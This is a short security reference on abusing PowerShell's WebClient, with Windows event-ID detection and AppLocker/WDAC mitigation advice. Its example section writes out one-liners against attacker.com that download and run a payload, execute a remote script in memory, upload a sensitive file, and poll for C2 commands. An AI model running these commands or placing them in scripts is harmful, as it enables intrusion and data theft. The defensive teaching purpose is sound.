# PowerShell WebClient Abuse
## What is it?
*PowerShell provides a built-in ```WebClient``` (or ```Invoke-WebRequest```) that allows downloading and uploading files over HTTP, HTTPS, and FTP.*  
*Attackers exploit this functionality to **retrieve payloads, exfiltrate data, and establish C2 communication.***

*Because PowerShell is a **trusted system component**, many security tools fail to detect its misuse.*

## Legitimate Usage
- **Automate File Downloads** → Fetch updates, scripts, or data from the internet.
- **Upload Files to Remote Servers** → Send logs or reports to a central server.
- **Web Scraping & API Calls** → Interact with web services programmatically.
- **Automated Software Deployment** → Download and install software remotely.

## How to abuse it
- **File Download for Malware Execution** → Fetch and execute remote payloads.
- **Data Exfiltration** → Upload sensitive data to an external server.
- **Bypass Security Controls** → Use trusted PowerShell components to evade network monitoring.
- **C2 Communication** → Establish persistent communication with an attacker's server.

## Example Attacks
### 1. Download & Execute a Remote Payload
*Attackers can download and execute malware from a remote server using PowerShell's WebClient.*

```
$wc = New-Object System.Net.WebClient $wc.DownloadFile("http://attacker.com/malware.exe", "C:\Users\Public\malware.exe") Start-Process "C:\Users\Public\malware.exe"
```

**Effect:**
- Downloads ```malware.exe``` and executes it.
- No user interaction required.

### 2. In-Memory Execution (No Disk Write)
*Attackers avoid file-based detection by executing payloads directly in memory.*

```
IEX (New-Object System.Net.WebClient).DownloadString("http://attacker.com/payload.ps1")
```

**Effect:**
- Fetches and executes the PowerShell script **without writing to disk**.
- Evades traditional AV and file monitoring.

### 3. Data Exfiltration to an Attacker's Server
*PowerShell can send stolen data to an attacker's server using HTTP POST requests.*

```
$wc = New-Object System.Net.WebClient $data = Get-Content C:\SensitiveData.txt $wc.UploadString("http://attacker.com/upload", $data)
```

**Effect:**
- Reads ```SensitiveData.txt``` and sends it to ```attacker.com```.

### 4. C2 Communication via PowerShell WebClient
*Attackers can create a simple C2 channel using PowerShell WebClient.*

while ($true) { $cmd = (New-Object System.Net.WebClient).DownloadString("http://attacker.com/command") iex $cmd Start-Sleep 10 }

**Effect:**
- Contacts ```attacker.com``` for new commands every 10 seconds.
- Executes received commands **silently**.

## Detection & Mitigation
### Detection Methods
**Monitor Suspicious PowerShell Activity**
- **Event ID 4104 (Script Execution)** → Detects remote script execution.
- **Look for ```WebClient``` or ```Invoke-WebRequest``` usage** in PowerShell logs.

**Detect Unusual Network Traffic**
- **Event ID 5156 (Outbound Connection)** → Detects unexpected outbound connections.
- **Monitor for suspicious HTTP/HTTPS requests from PowerShell.**

**Identify Memory-Only Attacks**
- **Use PowerShell logging (Script Block Logging)** to detect in-memory execution.

### Mitigation Strategies
- **Restrict PowerShell Execution** → Use AppLocker or WDAC to enforce execution policies.
- **Disable Unused PowerShell Features** → Block ```Invoke-WebRequest``` and ```WebClient``` if not needed.
- **Monitor & Alert on Suspicious PowerShell Use** → Log and analyze all PowerShell executions.
- **Implement Network Monitoring** → Detect unauthorized outbound traffic from PowerShell.
